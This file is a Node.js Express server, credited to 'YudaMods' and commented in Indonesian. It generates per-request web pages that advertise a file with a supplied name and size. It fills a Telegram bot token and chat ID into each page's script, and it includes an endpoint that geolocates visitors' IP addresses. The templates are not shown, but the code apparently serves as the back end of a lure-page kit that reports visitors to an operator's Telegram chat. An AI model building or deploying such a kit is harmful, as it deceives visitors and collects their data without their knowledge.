const express = require("express");
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");
const crypto = require("crypto");
const fetch = require("node-fetch");

const app = express();
const PORT = process.env.PORT || 8080;

// Middleware untuk menangani JSON dan file statis
app.use(bodyParser.json());
app.use("/public", express.static(path.join(__dirname, "public")));

// Helper untuk membuat folder random
const generateRandomDir = () => crypto.randomBytes(5).toString("hex");

// API untuk mendapatkan IP pengunjung
app.get("/api/ip", async (req, res) => {
  try {
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    const response = await fetch(`https://ipapi.co/${ip}/json/`);
    const data = await response.json();
    res.status(200).json({ ip: data.ip, location: data.city });
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch IP" });
  }
});

// Endpoint utama untuk membuat file dinamis
app.get("/generate", (req, res) => {
  const { chatId, filename, size } = req.query;

  if (!chatId || !filename || !size) {
    return res.status(400).json({ error: "Missing required parameters" });
  }

  const randomDir = generateRandomDir();
  const dirPath = path.join(__dirname, "results", randomDir);
  fs.mkdirSync(dirPath, { recursive: true });

  // Generate index.html
  const htmlContent = fs
    .readFileSync(path.join(__dirname, "templates/index.template.html"), "utf8")
    .replace("{{filename}}", filename)
    .replace("{{size}}", size)
    .concat(`\n<!-- Creator: YudaMods -->`); // Tambahkan komentar creator di HTML
  fs.writeFileSync(path.join(dirPath, "index.html"), htmlContent);

  // Generate main.js
  const jsContent = fs
    .readFileSync(path.join(__dirname, "templates/main.template.js"), "utf8")
    .replace("{{botToken}}", "your-telegram-bot-token")
    .replace("{{chatId}}", chatId)
    .concat(`\n// Creator: YudaMods`); // Tambahkan komentar creator di JS
  fs.writeFileSync(path.join(dirPath, "main.js"), jsContent);

  res.status(200).json({
    message: "File generated successfully",
    url: `/results/${randomDir}/index.html`,
    creator: "YudaMods",
  });
});


// Menyediakan folder hasil untuk diakses
app.use("/results", express.static(path.join(__dirname, "results")));

// Jalankan server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
